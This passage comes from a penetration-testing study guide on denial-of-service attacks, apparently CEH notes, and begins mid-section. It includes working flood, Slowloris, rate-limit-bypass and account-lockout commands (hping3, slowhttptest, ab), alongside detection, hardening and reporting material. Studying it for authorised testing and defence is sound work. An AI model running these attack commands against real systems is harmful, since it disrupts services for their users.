curl -X POST http://TARGET_IP/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d "username=admin&password=test"
# Change IP each request → bypass IP-based rate limiting
```

### 12.3 Account Lockout DoS

**If application locks account after N failed logins:**
- Attacker can lock out all user accounts by intentionally failing logins
- This is itself a DoS attack on authentication

**Test:**
```bash
# Try to lock a known username
for i in $(seq 1 10); do
  curl -X POST http://TARGET/login -d "username=victim&password=wrong${i}"
done
# If account locked → legitimate user can't log in → DoS
```

---

## 13. Network-Level Pentest Methodology

### Phase 1: Reconnaissance

```bash
# Identify target IP range and services
nmap -sn TARGET_RANGE/24                    # ping sweep
nmap -sV -p 80,443,53,123,161 TARGET_IP    # service version detection

# Check for potentially amplifiable services
nmap -sU -p 53,123,161,1900,11211 TARGET_IP
# If any UDP services respond → check for amplification potential

# Check DNS server type
dig @TARGET_IP version.bind CHAOS TXT
# Reveals DNS server software → check for known DoS vulns

# Check NTP
ntpdc -c monlist TARGET_IP
# If responds → monlist enabled → NTP amplification potential

# Check Memcached exposure
echo -e "stats\r\n" | nc -u TARGET_IP 11211
# If responds → exposed Memcached
```

### Phase 2: Vulnerability Assessment

```bash
# Check TCP SYN cookie status on target Linux
# (via response behavior analysis)
hping3 -S -p 80 --count 10000 TARGET_IP &
# Then immediately test if legitimate connections work
curl --connect-timeout 5 http://TARGET_IP/

# Test for Slowloris vulnerability
slowhttptest -c 200 -H -i 10 -r 50 -t GET -u http://TARGET_IP/ -x 24 -p 10
# Check output: "service is vulnerable" or "service is not vulnerable"

# Test SSL renegotiation DoS potential
openssl s_client -connect TARGET_IP:443
# Inside: type 'R' to renegotiate multiple times, measure CPU impact

# Test for QUIC/UDP reflection potential
nmap -sU --script dns-recursion TARGET_IP
nmap -sU --script ntp-monlist TARGET_IP
```

### Phase 3: Controlled Testing

**Always document these before testing:**
- Written authorization from client
- Test window (date/time, duration)
- Emergency contact for abort
- Monitoring contact on client side
- Maximum traffic rate agreed upon

```bash
# Controlled SYN flood test (measure server response)
# Monitor from separate session simultaneously
ssh admin@TARGET_IP "watch -n 1 'ss -s; netstat -an | grep SYN_RECV | wc -l'"

# From attacker machine (authorized):
sudo hping3 -S -p 80 --rand-source -i u1000 TARGET_IP
# -i u1000 = 1 packet every 1000 microseconds (1000 pps — controlled rate)
# Increase rate gradually, note when service degrades

# Controlled HTTP flood
ab -n 50000 -c 500 http://TARGET_IP/
# Monitor server response time degradation
```

### Phase 4: Reporting

**DoS finding template for pentest report:**

```
Finding: [Service] Vulnerable to [Attack Type]
Severity: High / Critical
CVSS Score: 7.5 (typical for DoS)

Description:
  The [service] on [host] is vulnerable to [attack type]. During testing,
  [N] concurrent requests/packets caused [service degradation/outage]
  within [time] seconds.

Evidence:
  - Attack tool output
  - Server log showing degradation
  - Response time measurements before/after

Impact:
  - Service unavailability for legitimate users
  - Potential financial/reputational impact
  - SLA violations

Recommendation:
  1. [Specific mitigation step 1]
  2. [Specific mitigation step 2]
  3. [Reference to best practice guide]

References:
  - CVE-XXXX-XXXX (if applicable)
  - OWASP DoS category
```

---

## 14. Traffic Analysis & Attack Detection

### Network-Level Detection

```bash
# Real-time traffic monitoring
sudo tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0' | head -50
# Monitor for SYN packets

# Count packets per source IP (detect flood source)
sudo tcpdump -i eth0 -n | awk '{print $3}' | sort | uniq -c | sort -rn | head

# Monitor bandwidth usage
sudo iftop -i eth0 -n

# Check connection states
ss -s
netstat -an | awk '{print $6}' | sort | uniq -c | sort -rn

# netstat breakdown
netstat -an | grep ":80 " | awk '{print $6}' | sort | uniq -c | sort -rn
# Shows: ESTABLISHED, TIME_WAIT, SYN_RECV counts → spike in SYN_RECV = SYN flood

# Count connections per IP on port 80
netstat -an | grep ":80 " | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# Top talkers with nload
sudo apt install nload
nload eth0
```

### Wireshark Filters for DoS Analysis

```
# SYN flood filter
tcp.flags.syn == 1 && tcp.flags.ack == 0

# UDP flood
udp && !dns

# ICMP flood
icmp.type == 8

# Slowloris (many connections, few complete requests)
http.request && tcp.analysis.retransmission

# Fragment attack
ip.frag_offset > 0 || ip.flags.mf == 1

# DNS amplification (large DNS responses)
dns.flags.response == 1 && dns.length > 512

# SYN-ACK from server (should be in ratio with incoming SYN)
tcp.flags == 0x012

# Rapid Reset (HTTP/2)
http2.type == 3  # RST_STREAM frames
```

### System-Level Detection

```bash
# Monitor CPU usage spike
top -bn1 | head -20
mpstat 1 5  # CPU stats every second

# Check for file descriptor exhaustion (Slowloris indicator)
cat /proc/sys/fs/file-nr
# Format: open_fds | 0 | max_fds
# If open approaches max → fd exhaustion

# Monitor Apache connections
apachectl fullstatus | grep "requests currently"
# Or
curl -s localhost/server-status | grep "requests currently"

# Check systemd service restart loops
journalctl -u nginx -f
journalctl -u apache2 -f

# Kernel log — TCP errors
dmesg | grep -i "tcp\|syn\|flood"

# iptables drop counter
sudo iptables -L INPUT -nv | grep -v "0     0"
```

### Automated Detection Tools

```bash
# fail2ban (detects and bans offending IPs)
sudo apt install fail2ban
sudo systemctl status fail2ban

# View banned IPs
sudo fail2ban-client status
sudo fail2ban-client status sshd

# Add custom jail for HTTP DoS in /etc/fail2ban/jail.local:
[http-flood]
enabled = true
port = http,https
filter = http-flood
logpath = /var/log/apache2/access.log
maxretry = 200
findtime = 60
bantime = 3600

# ModSecurity WAF (Apache)
sudo apt install libapache2-mod-security2
# Detects Slowloris, floods, anomalous patterns
```

---

## 15. Mitigation & Defense Techniques

### 15.1 OS-Level Linux Hardening Against DoS

```bash
# SYN Cookies (most important SYN flood defense)
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf

# Increase SYN backlog
echo "net.ipv4.tcp_max_syn_backlog = 4096" >> /etc/sysctl.conf

# Reduce SYN-ACK retries (half-open connection timeout faster)
echo "net.ipv4.tcp_synack_retries = 1" >> /etc/sysctl.conf

# Increase local port range (more available ports for connections)
echo "net.ipv4.ip_local_port_range = 1024 65535" >> /etc/sysctl.conf

# Reduce TIME_WAIT (recycle sockets faster)
echo "net.ipv4.tcp_fin_timeout = 15" >> /etc/sysctl.conf
echo "net.ipv4.tcp_tw_reuse = 1" >> /etc/sysctl.conf

# Increase max open files (prevent fd exhaustion)
echo "fs.file-max = 2097152" >> /etc/sysctl.conf

# ICMP rate limiting
echo "net.ipv4.icmp_ratelimit = 100" >> /etc/sysctl.conf

# Disable ICMP redirect acceptance (prevent routing manipulation)
echo "net.ipv4.conf.all.accept_redirects = 0" >> /etc/sysctl.conf
echo "net.ipv4.conf.all.send_redirects = 0" >> /etc/sysctl.conf

# Ignore broadcast pings (prevent Smurf amplification)
echo "net.ipv4.icmp_echo_ignore_broadcasts = 1" >> /etc/sysctl.conf

# Enable reverse path filtering (detect spoofed IPs)
echo "net.ipv4.conf.all.rp_filter = 1" >> /etc/sysctl.conf

# Log suspicious packets
echo "net.ipv4.conf.all.log_martians = 1" >> /etc/sysctl.conf

# Apply changes
sysctl -p
```

### 15.2 iptables Firewall Rules

```bash
# --- Rate Limiting ---

# Limit new SSH connections to 5/minute
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m limit --limit 5/min --limit-burst 5 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j DROP

# Limit SYN packets
iptables -A INPUT -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Limit HTTP connections per IP (connection limit)
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 100 -j REJECT

# Limit ICMP ping rate
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# --- Spoofed IP Protection ---

# Drop packets claiming to be from private networks on public interface
iptables -A INPUT -i eth0 -s 10.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP

# Drop fragments (prevent fragmentation attacks)
iptables -A INPUT -f -j DROP

# Drop NULL packets
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

# Drop XMAS packets
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# --- Block Common Attack Patterns ---

# Block SYN flood (stateful)
iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP

# Block UDP flood on specific ports
iptables -A INPUT -p udp --dport 53 -m limit --limit 100/s --limit-burst 200 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### 15.3 nginx Configuration for DoS Hardening

```nginx
# /etc/nginx/nginx.conf

http {
    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    limit_conn conn_limit 20;

    # Limit request rate per IP (100 req/min)
    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=100r/m;
    limit_req zone=req_limit burst=200 nodelay;

    # Limit request body size (prevent large POST DoS)
    client_max_body_size 10m;

    # Timeouts (anti-Slowloris)
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 5s 5s;
    send_timeout 10s;

    # Buffer sizes (prevent buffer overflow DoS)
    client_body_buffer_size 128k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 4k;

    # Limit HTTP methods
    if ($request_method !~ ^(GET|HEAD|POST)$) {
        return 405;
    }

    # Block suspicious User-Agents
    if ($http_user_agent ~* "(nikto|sqlmap|nmap|masscan|dirbuster)") {
        return 403;
    }

    # Enable gzip (reduce bandwidth per response)
    gzip on;
    gzip_types text/plain application/json;
}
```

### 15.4 Apache Configuration for DoS Hardening

```apache
# /etc/apache2/apache2.conf or .htaccess

# mod_reqtimeout — anti-Slowloris
<IfModule mod_reqtimeout.c>
    RequestReadTimeout header=10-20,MinRate=500 body=20,MinRate=500
</IfModule>

# Limit max request body
LimitRequestBody 10485760

# Limit connection timeout
Timeout 60
KeepAliveTimeout 5
MaxKeepAliveRequests 100

# mod_evasive — HTTP flood protection
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097
    DOSPageCount        5
    DOSSiteCount        50
    DOSPageInterval     1
    DOSSiteInterval     1
    DOSBlockingPeriod   10
    DOSEmailNotify      admin@example.com
    DOSLogDir           /var/log/mod_evasive
</IfModule>
```

### 15.5 Cloud / CDN-Level Defense

**Cloudflare:**
- Under Attack Mode → enables JS challenge for all visitors
- Rate limiting rules (requests per IP per minute)
- DDoS protection at network edge (scrubs traffic before hitting origin)
- WAF rules for application-layer attacks

**AWS Shield:**
- Shield Standard (free) → L3/L4 protection
- Shield Advanced → L7 protection, 24/7 DRT (DDoS Response Team)

**Architecture for DDoS-resistant deployment:**
```
Internet
    │
    ▼
Cloudflare / AWS CloudFront / Akamai   ← Absorbs volumetric attacks
    │
    ▼
Load Balancer (AWS ALB / nginx)        ← Distributes, rate limits
    │
    ▼
Web Server Pool (Auto Scaling)         ← Scales out during attack
    │
    ▼
Database (RDS with read replicas)      ← Protected, not directly exposed
```

### 15.6 BGP Blackholing (ISP-level)

When under massive DDoS:
1. Notify upstream ISP
2. ISP advertises victim's IP via BGP with community tag for blackhole
3. All traffic to that IP dropped at internet backbone level
4. Collateral: legitimate traffic also dropped
5. Used as last resort during massive volumetric attacks

### 15.7 Anycast Routing for DDoS Mitigation

- Same IP address announced from multiple geographically distributed PoPs
- Traffic routed to nearest PoP by BGP
- Attack traffic split across all PoPs → each handles fraction of attack volume
- Used by Cloudflare, Akamai, Google

---

## 16. Countermeasures by Attack Type

| Attack Type | Primary Defense | Secondary Defense |
|-------------|----------------|-------------------|
| SYN Flood | SYN Cookies, rate limit SYN | Increase backlog, upstream filter |
| UDP Flood | Block unused UDP ports | ISP-level scrubbing |
| ICMP Flood | Rate-limit ICMP | Block echo-request at perimeter |
| HTTP Flood | Rate limiting, CAPTCHA | WAF, CDN (Cloudflare) |
| Slowloris | Nginx (event-driven), timeouts | mod_reqtimeout, connection limits |
| RUDY | Request timeout, body size limit | WAF, connection draining |
| DNS Amplification | Disable open recursive DNS | BCP38 (source IP filtering) |
| NTP Amplification | Disable monlist | Update NTP, firewall UDP 123 |
| Memcached Amplif. | Disable UDP, don't expose publicly | Firewall UDP 11211 |
| ReDoS | Atomic groups in regex, timeout | Input length validation |
| XML Bomb | Disable DTD processing | XML parser entity limits |
| Smurf | Block directed broadcasts | RFC 2644 compliance by ISP |
| Fragmentation | Drop fragments at firewall | IP defrag in IDS/IPS |
| Botnet DDoS | CDN/scrubbing center | BGP blackholing, anycast |

---

## 17. CEH Exam Key Points

### High-Priority CEH Topics

**DoS Attack Categories (must memorize):**
1. **Volume-based attacks** — flood network bandwidth (UDP flood, ICMP flood)
2. **Protocol attacks** — exploit protocol weakness (SYN flood, Ping of Death)
3. **Application layer attacks** — exploit app vulnerabilities (HTTP flood, Slowloris)

**Key Terms:**
- **Agent/Zombie/Bot** — compromised machine in botnet
- **Handler/Master** — secondary C2 node that controls agents
- **Bot Herder/Botmaster** — attacker controlling botnet
- **Trin00** — classic DDoS tool using UDP flood
- **TFN (Tribe Flood Network)** — classic DDoS tool (SYN, ICMP, UDP, Smurf)
- **TFN2K** — TFN with encrypted communications
- **Stacheldraht** — combines Trin00 and TFN, adds encrypted C2

**SYN Flood defense → SYN Cookies** (most tested)

**Amplification factors (CEH loves these):**
- Smurf: depends on subnet size
- DNS: up to 54x
- NTP (monlist): up to 556x

**Slowloris affects:** Apache (thread-per-connection model)
**Slowloris resistant:** nginx (event-driven, non-blocking I/O)

**DoS Detection methods:**
- Activity profiling
- Sequential change-point detection
- Wavelet-based signal analysis

**Legal classification:**
- DoS is a federal crime (CFAA in USA)
- Considered cyber terrorism when targeting critical infrastructure

### CEH Practice Questions Mindmap

```
Q: What attack sends spoofed SYN packets to exhaust TCP backlog?
A: SYN Flood

Q: What defense against SYN flood doesn't allocate resources until handshake completes?
A: SYN Cookies

Q: What attack uses broadcast addresses with spoofed source IP?
A: Smurf Attack

Q: NTP amplification uses which command?
A: monlist

Q: What DDoS tool was used by Anonymous in Operation Payback?
A: LOIC (Low Orbit Ion Cannon)

Q: Slowloris targets which server vulnerability?
A: Thread-per-connection model — keeps connections open with partial headers

Q: What type of attack sends packets with same source and destination IP?
A: Land Attack

Q: What is the term for compromised machines in a DDoS network?
A: Zombies / Bots / Agents

Q: Which protocol allows 10,000x amplification?
A: Memcached (UDP port 11211)

Q: What technique prevents IP spoofing at ISP level?
A: BCP38 / ingress filtering / uRPF (Unicast Reverse Path Forwarding)
```

---

## 18. Bug Bounty & Real-World DoS Testing

### Application-Level DoS in Bug Bounty

Most bug bounty programs **do allow** application-level DoS testing but **prohibit network-level** (SYN flood, UDP flood). Focus on:

**High-value targets:**

1. **Unauthenticated resource exhaustion:**
   - Find heavy endpoints accessible without login
   - Verify no rate limiting
   - Document: 1 request consumed X seconds of CPU / Y MB RAM

2. **Regular expression DoS (ReDoS):**
   - Target: email validation, username/password fields, search
   - Tool: `redos-checker` or manual testing

3. **Long password hash DoS:**
   - Test: send 10,000+ character password to login endpoint
   - If no length limit + bcrypt → CPU hang

4. **GraphQL query complexity:**
   - Send deeply nested queries
   - Send introspection query if allowed
   - Infinite loop queries (circular references)

5. **ZIP/XML bomb via file upload:**
   - Upload crafted zip/XML → server extracts → OOM

6. **Algorithmic complexity DoS:**
   - Hash collision attacks on language-level hash tables
   - Worst-case sorting inputs

**Report writing for DoS bugs:**

```markdown
Title: Unauthenticated ReDoS in /api/user/search endpoint

Severity: Medium (CVSS 5.9)

Summary:
The `/api/user/search` endpoint processes user input through a catastrophically 
backtracking regular expression. A single crafted request takes >10 seconds to 
process, degrading server performance.

Steps to Reproduce:
1. Send: GET /api/user/search?q=aaaaaaaaaaaaaaaaaaaaaa!
2. Observe >10 second response time

Impact:
10 concurrent requests can saturate server CPU, denying service to legitimate users.

PoC Code: [attach minimal reproduction]

Mitigation:
Replace regex `^(a+)+$` with atomic group alternative or enforce input length limit.
```

### Bug Bounty Platform Policies on DoS

| Platform | Network DoS | App-Level DoS |
|----------|-------------|---------------|
| HackerOne | ❌ Prohibited | ✅ Allowed (with care) |
| Bugcrowd | ❌ Prohibited | ✅ Allowed (with evidence) |
| Intigriti | ❌ Prohibited | ✅ Case-by-case |
| Synack | ❌ Prohibited | ✅ Allowed |

**Always read the program's specific scope and rules.**

---

## 19. Quick Reference Cheat Sheet

### Attack → Layer → Tool Matrix

```
ATTACK              | LAYER | TOOL                   | DEFENSE
--------------------|-------|------------------------|---------------------------
SYN Flood           | L4    | hping3 -S --flood      | SYN Cookies, iptables
UDP Flood           | L4    | hping3 --udp --flood   | Block unused UDP ports
ICMP Flood          | L3    | hping3 -1 --flood      | Rate-limit ICMP
ACK Flood           | L4    | hping3 -A --flood      | Stateful firewall
HTTP GET Flood      | L7    | ab, wrk, LOIC          | Rate limit, Cloudflare
HTTP POST Flood     | L7    | RUDY, ab               | Body timeout, WAF
Slowloris           | L7    | slowhttptest -H        | nginx, mod_reqtimeout
RUDY                | L7    | slowhttptest -B        | Body timeout
DNS Amplification   | L3    | Spoofed DNS queries    | Close open resolvers
NTP Amplification   | L3    | Spoofed NTP monlist    | Disable monlist
Memcached Ampl.     | L3    | Spoofed UDP 11211      | Firewall UDP 11211
ReDoS               | L7    | Crafted input          | Atomic groups, timeout
XML Bomb            | L7    | Crafted XML upload     | Disable DTD, parser limits
Smurf               | L3    | Spoofed ICMP broadcast | Block directed broadcast
Ping of Death       | L3    | Fragmented ICMP        | OS patches
Land Attack         | L4    | hping3 -a TARGET       | OS patches
```

### Key Port Numbers

```
UDP 53   → DNS (amplification)
UDP 123  → NTP (monlist amplification)
UDP 161  → SNMP (amplification)
UDP 1900 → SSDP (amplification)
UDP 11211 → Memcached (50,000x amplification)
UDP 19   → Chargen (358x amplification)
UDP 389  → LDAP (amplification)
TCP 80   → HTTP (SYN, HTTP floods, Slowloris)
TCP 443  → HTTPS (SSL DoS, HTTP/2 attacks)
```

### hping3 Quick Reference

```bash
-S      SYN flag
-A      ACK flag
-F      FIN flag
-R      RST flag
-P      PSH flag
-U      URG flag
-1      ICMP mode
--udp   UDP mode
-p N    destination port N
-d N    data size N bytes
-f      fragment packet
--flood send as fast as possible
--rand-source randomize source IP
-i uN   interval N microseconds
-a IP   spoof source IP as IP
-c N    count N packets
```

### Linux Commands for Monitoring During Test

```bash
# Connections
ss -s                          # Connection summary
ss -n state SYN-RECV           # Half-open connections (SYN flood indicator)
netstat -an | grep :80         # All port 80 connections

# Bandwidth
iftop -i eth0                  # Real-time bandwidth per host
bmon                           # Bandwidth monitor

# CPU/Memory
top                            # Overall system load
htop                           # Better top
vmstat 1                       # System stats per second

# Logs
tail -f /var/log/apache2/access.log
tail -f /var/log/nginx/access.log
dmesg -T | tail -50            # Kernel messages
journalctl -f                  # systemd journal
```

### Useful `sysctl` Values for DoS Defense

```bash
net.ipv4.tcp_syncookies = 1          # Enable SYN cookies
net.ipv4.tcp_max_syn_backlog = 4096  # Increase SYN backlog
net.ipv4.tcp_synack_retries = 1      # Reduce SYN-ACK retries
net.ipv4.tcp_fin_timeout = 15        # Faster socket recycle
net.ipv4.tcp_tw_reuse = 1            # Reuse TIME_WAIT sockets
net.ipv4.icmp_echo_ignore_broadcasts = 1  # No Smurf
net.ipv4.conf.all.rp_filter = 1      # Drop spoofed IPs
net.ipv4.conf.all.accept_redirects = 0    # No ICMP redirects
fs.file-max = 2097152               # Max open file descriptors
net.core.somaxconn = 4096            # Max listen queue
net.ipv4.ip_local_port_range = 1024 65535  # Port range
```

---

## 📖 References & Further Study

| Resource | Topic | URL |
|----------|-------|-----|
| Cloudflare Blog | DDoS reports, attack analysis | blog.cloudflare.com |
| Imperva Blog | DDoS trends | imperva.com/blog |
| OWASP DoS Cheat Sheet | Application DoS | owasp.org |
| RFC 4987 | TCP SYN Flooding defenses | tools.ietf.org/rfc4987 |
| US-CERT AA22-131A | DDoS guidance | cisa.gov |
| PortSwigger Research | App-level DoS | portswigger.net/research |
| HackTricks | DoS techniques | book.hacktricks.xyz |
| TryHackMe | DDoS rooms | tryhackme.com |

---

## ⚖️ Legal & Ethical Reminder

```
✅ LEGAL: Testing your own systems
✅ LEGAL: Testing with written authorization (signed scope document)
✅ LEGAL: Bug bounty programs (within scope rules)
✅ LEGAL: Isolated lab environments (VMs, your own network)

❌ ILLEGAL: Testing any system without explicit permission
❌ ILLEGAL: Using volumetric tools against live targets
❌ ILLEGAL: Participating in booter/stresser services
❌ ILLEGAL: Joining or operating a botnet

Bangladesh ICT Act 2006 Section 57 and Cyber Security Act 2023 both
criminalize unauthorized disruption of computer services. Penalties include
imprisonment and fines.
```

---

*Notes maintained by: Rasel Hossain | Penetration Testing Intern | Creative IT Institute*
*GitHub: github.com/raselhossain79 | TryHackMe: theloser*
*Last Updated: 2025*
